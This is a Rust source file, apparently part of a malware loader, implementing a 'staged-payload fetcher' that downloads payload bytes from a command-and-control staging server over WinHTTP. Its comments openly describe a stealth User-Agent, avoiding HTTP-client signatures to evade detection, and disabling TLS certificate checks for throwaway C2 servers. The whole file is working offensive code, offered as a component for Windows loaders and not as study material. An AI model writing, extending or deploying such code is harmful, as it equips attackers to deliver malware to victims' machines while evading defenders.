//! Staged-payload fetcher.
//!
//! Performs an HTTPS GET against the C2 staging endpoint with a Bearer JWT
//! and a stealth User-Agent, returning the response body bytes.
//!
//! Uses WinHTTP (winhttp.dll) — preferred over WinINet because it does not
//! use the browser cache, does not pop UI on TLS errors, and is the canonical
//! API for background services. No `reqwest`/`hyper`/TLS-crate dependency,
//! so the resulting binary stays small and free of Rust HTTP-client signatures.

#[cfg(target_os = "windows")]
pub fn fetch(url: &str, jwt: &str, user_agent: &str) -> Option<Vec<u8>> {
    use windows_sys::Win32::Foundation::FALSE;
    use windows_sys::Win32::Networking::WinHttp::{
        WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpReceiveResponse,
        WinHttpQueryDataAvailable, WinHttpReadData, WinHttpCloseHandle, WinHttpCrackUrl,
        WinHttpSetOption,
        URL_COMPONENTS, WINHTTP_FLAG_SECURE,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_OPTION_SECURITY_FLAGS,
        SECURITY_FLAG_IGNORE_UNKNOWN_CA, SECURITY_FLAG_IGNORE_CERT_DATE_INVALID,
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID, SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE,
    };

    // URL → wide
    let url_w: Vec<u16> = url.encode_utf16().chain(std::iter::once(0)).collect();

    // Crack URL into components (host, port, path, scheme)
    let mut comp: URL_COMPONENTS = unsafe { core::mem::zeroed() };
    comp.dwStructSize     = core::mem::size_of::<URL_COMPONENTS>() as u32;
    comp.dwSchemeLength   = u32::MAX;
    comp.dwHostNameLength = u32::MAX;
    comp.dwUrlPathLength  = u32::MAX;
    let ok = unsafe { WinHttpCrackUrl(url_w.as_ptr(), (url_w.len() - 1) as u32, 0, &mut comp) };
    if ok == 0 { return None; }

    let host: Vec<u16> = unsafe {
        core::slice::from_raw_parts(comp.lpszHostName, comp.dwHostNameLength as usize)
            .iter().copied().chain(std::iter::once(0u16)).collect()
    };
    let path: Vec<u16> = unsafe {
        core::slice::from_raw_parts(comp.lpszUrlPath, comp.dwUrlPathLength as usize)
            .iter().copied().chain(std::iter::once(0u16)).collect()
    };
    let port  = comp.nPort;
    let https = port == 443 || port == 8443;

    let ua_w: Vec<u16> = user_agent.encode_utf16().chain(std::iter::once(0)).collect();
    let session = unsafe { WinHttpOpen(
        ua_w.as_ptr(),
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0,
    ) };
    if session.is_null() { return None; }

    let conn = unsafe { WinHttpConnect(session, host.as_ptr(), port, 0) };
    if conn.is_null() {
        unsafe { WinHttpCloseHandle(session); }
        return None;
    }

    let req = unsafe { WinHttpOpenRequest(
        conn,
        wide_get_const(),
        path.as_ptr(),
        core::ptr::null(),
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        if https { WINHTTP_FLAG_SECURE } else { 0 },
    ) };
    if req.is_null() {
        unsafe { WinHttpCloseHandle(conn); WinHttpCloseHandle(session); }
        return None;
    }

    // Tolerate self-signed / DEV TLS — matches operator expectations for
    // throwaway C2s. Production C2s with valid certs are unaffected.
    let mut flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                       | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                       | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                       | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    unsafe { WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS,
        &mut flags as *mut _ as *mut _, 4); }

    let auth = format!("Authorization: Bearer {}\r\n", jwt);
    let auth_w: Vec<u16> = auth.encode_utf16().collect();

    let sent = unsafe { WinHttpSendRequest(
        req,
        auth_w.as_ptr(), auth_w.len() as u32,
        core::ptr::null(), 0, 0, 0,
    ) };
    if sent == 0 {
        unsafe { WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(session); }
        return None;
    }

    if unsafe { WinHttpReceiveResponse(req, core::ptr::null_mut()) } == 0 {
        unsafe { WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(session); }
        return None;
    }

    let mut out: Vec<u8> = Vec::with_capacity(0x10000);
    loop {
        let mut avail: u32 = 0;
        if unsafe { WinHttpQueryDataAvailable(req, &mut avail) } == 0 { break; }
        if avail == 0 { break; }
        let mut buf = vec![0u8; avail as usize];
        let mut read: u32 = 0;
        if unsafe { WinHttpReadData(req, buf.as_mut_ptr() as *mut _, avail, &mut read) } == 0 { break; }
        if read == 0 { break; }
        buf.truncate(read as usize);
        out.extend_from_slice(&buf);
        // Cap at 8 MB to prevent runaway server from exhausting memory
        if out.len() > 8 * 1024 * 1024 { break; }
        let _ = FALSE;
    }

    unsafe { WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(session); }
    if out.is_empty() { None } else { Some(out) }
}

#[cfg(target_os = "windows")]
fn wide_get_const() -> *const u16 {
    // "GET\0" as UTF-16, stored in static.
    static GET_W: [u16; 4] = [b'G' as u16, b'E' as u16, b'T' as u16, 0];
    GET_W.as_ptr()
}

// Cross-platform no-op so the crate still builds during unit-test runs on
// non-Windows hosts; the loaders are only ever cross-compiled to Windows
// targets, so this branch never executes in production.
#[cfg(not(target_os = "windows"))]
pub fn fetch(_url: &str, _jwt: &str, _user_agent: &str) -> Option<Vec<u8>> {
    None
}
